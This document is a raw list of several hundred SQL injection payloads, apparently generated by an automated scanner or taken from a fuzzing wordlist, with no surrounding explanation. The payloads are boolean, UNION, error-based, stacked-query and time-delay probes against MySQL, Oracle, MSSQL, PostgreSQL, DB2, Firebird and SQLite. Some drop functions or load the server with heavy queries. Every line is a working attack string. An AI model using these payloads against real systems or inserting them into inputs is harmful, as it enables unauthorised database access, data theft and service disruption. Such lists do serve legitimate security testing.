+1) as khkv where 2944=2944 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+-5320 where 8051=8051 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1' in boolean mode) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)#
+-1408)) union all select 5715,5715,5715,5715,5715,5715--
+-3979' in boolean mode) union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#
+1 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1')));select (case when (7980=3703) then 7980 else 7980*(select 7980 from information_schema.character_sets) end)#
+1" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and "xwnw"="xwnw
+1%"))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((("%"="
+-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#
+1 union all select null,null,null,null,null,null#
+1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('bhlx' like 'bhlx
+1") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ("qblj" like "qblj
+-5857%")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (("%"="
+1%' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and '%'='
+1' where 9003=9003 waitfor delay '0:0:5'--
+-5959" or 2477=1144
+1%') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1" and 7533=7533
+1) as afxc where 7497=7497;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1')) as xuab where 4369=4369 union all select null,null,null--
+-1257') order by 1#
+1') as bscn where 6907=6907;select (case when (1724=6528) then 1724 else cast(1 as int)/(select 0 from dual) end) from dual--
+1" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and "onsd" like "onsd
+1" where 9756=9756;if(7899=7899) select 7899 else drop function zbbp--
+-3566%' or 2158=6289
+-9507%" union all select 3342,3342,3342,3342,3342#
+-9698) as pvhn where 3223=3223 or elt(6563=9210,9210)--
+1%"))) or sleep(5) and ((("%"="
+1"));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('zpkv'='zpkv
+-8080')) order by 1#
+-7231)) union all select 7639#
+1'))) waitfor delay '0:0:5' and ((('zhhf' like 'zhhf
+1') as bihs where 4197=4197;select pg_sleep(5)--
+1") as ghpx where 2873=2873 waitfor delay '0:0:5'--
+1") where 4905=4905 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1 where 8949=8949 and make_set(8403=8403,8899)--
+1%" and 2805=1345
+1%' union all select null,null,null--
+1') and 2305=1934
+1' in boolean mode);select (case when (1812=2446) then 1812 else cast(1 as int)/(select 0 from dual) end) from dual--
+1'+(select zukr where 9215=9215 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))+'
+1";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1') where 5491=5491 and 9198=9198--
+1";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+-4929" where 6381=6381 or 8571=8571--
+-8153') as qhlb where 4948=4948 union all select 4948,4948,4948,4948,4948,4948#
+1"))) or 8421=(select count(*) from generate_series(1,5000000)) and ((("ugtw"="ugtw
+1 where 5443=5443;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#
+1 union all select null,null,null,null--
+1%") union all select null,null,null,null,null,null--
+1%' and 7533=7533 and '%'='
+1',iif(6625=6625,1,1/0)
+1) as lfra where 2669=2669 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--
+-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#
+-1504") as wpes where 6256=6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#
+1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy
+1' where 5060=5060;select count(*) from generate_series(1,5000000)--
+1%';iif(5257=5257,1,1/0)
+-6512'+(select 'zdjx' where 5454=5454 order by 1--
+1") where 8196=8196;iif(2840=3788,1,1/0)
+1) where 9149=9149 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--
+1" and 2388=benchmark(5000000,md5(0x6d457153))#
+1%");call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+1')) as agdn where 8442=8442 and 3824=benchmark(5000000,md5(0x76555642))--
+1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+1';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
+1") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--
+-3582) where 5873=5873 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1 where 5485=5485 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1")) as exzo where 7518=7518 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--
+1'));select pg_sleep(5) and (('rnzp'='rnzp
+1")) and (1248=8705)*8705 and (("wvma" like "wvma
+-1863') or make_set(9354=9354,7185) and ('whwv'='whwv
+1' in boolean mode) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+-1366' or make_set(9354=9354,7185) and 'abre'='abre
+-6076")) or 8277=4757
+1) where 9821=9821 or (select * from (select(sleep(5)))sddo)#
+1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'='xemh
+-6109 union all select 6784--
+1") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ("ilrk"="ilrk
+1%')) union all select null,null,null#
+-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#
+-8819") where 9119=9119 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1') as ftyp where 5851=5851 or 4240=(select 4240 from pg_sleep(5))--
+1") where 2278=2278;if(7899=7899) select 7899 else drop function zbbp--
+-4681 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rltx
+1' rlike sleep(5) and 'cugs'='cugs
+1%")) or elt(5873=5873,sleep(5))#
+-8238')) union all select 9797,9797,9797,9797,9797,9797,9797,9797#
+1%' union all select null,null,null,null,null,null,null,null#
+1%"))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((("%"="
+1) as zdym where 1578=1578 union all select null,null,null#
+-6611%"))) union all select 8918,8918#
+1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('hcpo' like 'hcpo
+1%')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('%'='
+1'))) union all select null,null,null,null,null--
+1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)-- xsob
+1')) as kahn where 1361=1361 or (select * from (select(sleep(5)))sddo)#
+-9225) or (8258=2726)*2726 and (9900=9900
+1'+(select nvht where 9118=9118 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'
+1'||(select 'ozki' where 4435=4435 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))||'
+1')) rlike (select * from (select(sleep(5)))sgvo) and (('hqcz'='hqcz
+-6170))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1") or elt(6272=6272,sleep(5)) and ("dplf" like "dplf
+-1164") union all select 6617,6617,6617,6617,6617,6617--
+1') as taay where 7027=7027 and elt(4249=4249,7259)--
+1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('pehq' like 'pehq
+1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)
+1');select (case when (2968=2021) then 1 else 2968*(select 2968 from master..sysdatabases) end)--
+1) where 5866=5866 and 4595=4595#
+1) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (9509=9509
+-6984 order by 1#
+1%')) and 7533=7533 and (('%'='
+1' where 8729=8729;select benchmark(5000000,md5(0x714e4153))#
+1'));select (case when (5142=6855) then 5142 else 5142*(select 5142 from mysql.db) end)#
+1'||(select 'tezo' from dual where 4436=4436;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'
+1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('kpsg' like 'kpsg
+1)) as debc where 7428=7428 union all select null,null,null#
+1));select case when 7717=7717 then 1 else null end--
+1);if(7899=7899) select 7899 else drop function zbbp--
+1" and elt(2373=5817,5817) and "rsdt"="rsdt
+(select (case when (1421=1421) then 1 else 1421*(select 1421 from master..sysdatabases) end))
+1'+(select uhsy where 4596=4596 and (select * from (select(sleep(5)))fzno))+'
+1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj
+1'+(select wgmn where 4368=4368 and 7859=6151)+'
+1') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1" where 5039=5039 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'+(select 'ndpx' where 4061=4061 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+-5840') or elt(1032=1032,3623)
+1"))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((("yxpo" like "yxpo
+1'+(select bldn where 8321=8321 and 8635=(select count(*) from generate_series(1,5000000))--
+1)));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((9348=9348
+1 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1"))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((("frgb" like "frgb
+-1470'))) or 9323=9323#
+-1439" or 2849=8484 and "pmdl"="pmdl
+1' and 8407=(select count(*) from generate_series(1,5000000)) and 'zetf'='zetf
+1 and 8407=(select count(*) from generate_series(1,5000000))# tqmr
+1') as pxcd where 9754=9754 or sleep(5)--
+1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))
+1') where 3572=3572;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--
+1') rlike sleep(5)
+1%') union all select null,null,null,null,null,null--
+1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ogwd' like 'ogwd
+1'||(select 'bhxx' where 2585=2585;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
+1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1) as vbli where 5139=5139 and 2782=2625--
+1,(select (case when (8382=8382) then 1 else 1/(select 0) end))
+1") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ("kkim"="kkim
+1' and 8407=(select count(*) from generate_series(1,5000000)) and 'mnbg' like 'mnbg
+1 where 9752=9752;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1'||(select 'ozoj' where 1608=1608;call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+1") as rbgl where 3822=3822 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--
+1")) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (("bcxh" like "bcxh
+1"));(select * from (select(sleep(5)))srmq) and (("hxdd"="hxdd
+1")) as brwj where 9180=9180;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+-3270" where 2144=2144 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1"))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((("suxh"="suxh
+1));select like('abcdefg',upper(hex(randomblob(500000000/2))))--
+-5998%") union all select 2366,2366,2366,2366#
+1")) as khqq where 3637=3637 and 8407=(select count(*) from generate_series(1,5000000))--
+1%" and 3824=benchmark(5000000,md5(0x76555642)) and "%"="
+1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))#
+1'+(select 'fqkk' where 9725=9725;call regexp_substring(repeat(right(char(3702),0),500000000),null))+'
+1') where 6622=6622 order by 1--
+1) as ptxw where 9873=9873;begin dbms_lock.sleep(5); end--
+-7347")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#
+1%"))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((("%"="
+1%')));select (case when (2294=3651) then 2294 else 2294*(select 2294 from information_schema.character_sets) end)#
+1' and (select * from (select(sleep(5)))fzno)
+-9840')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dzlp'='dzlp
+1")) union all select null,null,null,null,null,null,null--
+-1550%"))) order by 1--
+1%') order by 1#
+1')));begin user_lock.sleep(5); end--
+1%')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('%'='
+1 union all select null,null,null,null,null#
+1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('gxgi'='gxgi
+1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3#
+-2241) where 7606=7606 or (8459=8459)*4906--
+-8200' in boolean mode) union all select 3360,3360--
+1'+(select acax where 4169=4169 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'
+1%"))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((("%"="
+-7485")) as caob where 4100=4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--
+1'))) and elt(1210=1210,sleep(5)) and ((('mbxh' like 'mbxh
+1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fmkz' like 'fmkz
+1') where 8167=8167;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
+1")) as iqgd where 7611=7611 union all select null,null,null,null,null#
+-6883") as tbai where 8121=8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--
+1"))) and 4124=7245 and ((("tuom"="tuom
+-9003")) union all select 9721,9721--
+1';waitfor delay '0:0:5'--
+-8655) where 3910=3910 union all select 3910,3910#
+1) as svkf where 6503=6503 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1") as aifd where 5962=5962;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+-4480') where 4661=4661 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1'+(select zpns where 6922=6922 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'
+1%" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and "%"="
+1" rlike (select (case when (3711=3313) then 1 else 0x28 end)) and "iqlh" like "iqlh
+1',(select (case when (6894=6087) then 1 else 6894*(select 6894 from information_schema.character_sets) end))
+1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)
+1") where 8407=8407 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- xlfz
+1 and (3020=3020)*6703# syuj
+1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('wqme'='wqme
+1) where 4866=4866;call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+-5995')) or 6872=6872 and (('pywh'='pywh
+1" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and "qzzg" like "qzzg
+1'+(select 'ggkm' where 3394=3394;call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+1'+(select 'iyyv' where 9500=9500 or (select * from (select(sleep(5)))ydpu))+'
+1)) as qgma where 7675=7675 rlike (select * from (select(sleep(5)))vwyq)#
+1")) as bosq where 4695=4695;select benchmark(5000000,md5(0x714e4153))#
+-7016%")) union all select 8847,8847,8847--
+-8521'+(select ucim where 9003=9003 union all select 9003--
+-1730' or 8571=8571--
+1);waitfor delay '0:0:5'
+1'+(select bjav where 6923=6923 and (select * from (select(sleep(5)))gcrr)#
+1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('jxqf' like 'jxqf
+1' where 9156=9156 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+-3219") order by 1--
+-1868") where 9495=9495 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ggiw'='ggiw
+1")));iif(1718=5436,1,1/0)
+-8355%"))) union all select 3004,3004,3004,3004,3004,3004,3004--
+-2312'))) union all select 5282,5282,5282,5282,5282,5282,5282,5282--
+1') as jdmh where 6175=6175 rlike sleep(5)#
+1")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (("qqky" like "qqky
+1"))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1") as lvbm where 8179=8179;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1' where 8749=8749 or 8421=(select count(*) from generate_series(1,5000000))--
+1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('yaml'='yaml
+1%"))) or (select * from (select(sleep(5)))ydpu) and ((("%"="
+-5202 union all select 5332,5332,5332,5332,5332,5332,5332#
+1) as bfuy where 3879=3879 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1%");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+-6760 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# ikqw
+(select (case when (5603=5603) then 5603 else cast(1 as int)/(select 0 from dual) end) from dual)
+1%")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (("%"="
+-4610')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('hdco'='hdco
+-8876')) or 3038=3038
+1%"))) union all select null,null#
+1');select pg_sleep(5)
+1') where 6842=6842;begin dbms_lock.sleep(5); end--
+1)) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+-2225' union all select 1545,1545,1545,1545#
+-9673) or 8571=8571--
+1")) as sgln where 7573=7573;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
+1%' union all select null,null,null,null,null,null,null,null,null,null#
+-9629'))) union all select 3077,3077,3077,3077#
+1'||(select 'ggfx' where 4932=4932 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'
+1') as llug where 2244=2244 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+-2748')) as gazw where 4624=4624 union all select 4624,4624#
+1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('cfzp' like 'cfzp
+1' in boolean mode) waitfor delay '0:0:5'#
+1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--
+1%') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('%'='
+elt(2427=2427,5518)
+1)));begin dbms_lock.sleep(5); end and (((4675=4675
+1"))) and 8407=(select count(*) from generate_series(1,5000000)) and ((("ynwr" like "ynwr
+1%');begin user_lock.sleep(5); end--
+1'))) and elt(9501=8427,8427) and ((('ahpp'='ahpp
+-5431"))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((("ipmo"="ipmo
+1'||(select 'rhcv' where 6228=6228;select (case when (3672=8360) then 3672 else 3672*(select 3672 from information_schema.character_sets) end)#
+1)) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((5336=5336
+1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))
+-8608" or 5460=4461--
+(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4501=4501) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)
+1',exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))
+1")) or 8156=(select count(*) from generate_series(1,5000000))--
+-1620)) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--
+1,(case when 2872=2872 then 1 else null end)
+-1244) as qszw where 2332=2332 union all select 2332,2332,2332,2332#
+-2048)) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--
+1" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1'+(select 'mquh' where 3933=3933;select case when 1613=2937 then 1 else null end--
+-7579%" or 6570=1764
+1') as mvai where 5856=5856 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--
+1;select sleep(5)#
+1"))) and (select * from (select(sleep(5)))fzno) and ((("uncg"="uncg
+-3462)) as biyl where 5143=5143 union all select 5143,5143,5143--
+1'||(select 'irfn' where 8360=8360;select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1) as mnyy where 4409=4409 union all select null,null,null,null--
+1) and sleep(5)
+1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq
+1'||(select 'mobv' from dual where 6338=6338;select sleep(5))||'
+1' in boolean mode) order by 1--
+1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1');iif(5257=5257,1,1/0)
+1")) as ynuw where 9138=9138;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--
+1";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)
+1%';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and '%'='
+-9120')) or 8571=8571--
+1") as ufai where 9673=9673;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1"));waitfor delay '0:0:5' and (("zili" like "zili
+1 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((8535=8535
+' or '1' = '1
+1' where 1557=1557;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('cysu' like 'cysu
+1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (9841=9841
+-9358' or 9887=2569--
+-6084")) union all select 7354,7354,7354,7354,7354,7354,7354,7354#
+1 where 3027=3027 and 4595=4595#
+1 union all select null,null,null,null,null,null,null,null,null,null--
+-5732') union all select 7614,7614,7614,7614--
+1") as axua where 6718=6718;if(8264=1939) select 8264 else drop function nsoq--
+-5780 or make_set(3464=4518,4518)-- icit
+1"));begin user_lock.sleep(5); end and (("kvts" like "kvts
+1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('nsji'='nsji
+1'))) rlike (select * from (select(sleep(5)))vwyq)#
+1 where 9393=9393 waitfor delay '0:0:5'--
+1" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and "ikhr"="ikhr
+-7600' or 7684=3181#
+1") where 7919=7919 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--
+1")));select * from generate_series(9058,9058,case when (9058=1183) then 1 else 0 end) limit 1--
+1') as bdei where 9531=9531 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+-3856") as iyzl where 7394=7394 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1" or 6793=(select 6793 from pg_sleep(5))
+1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('lbwh'='lbwh
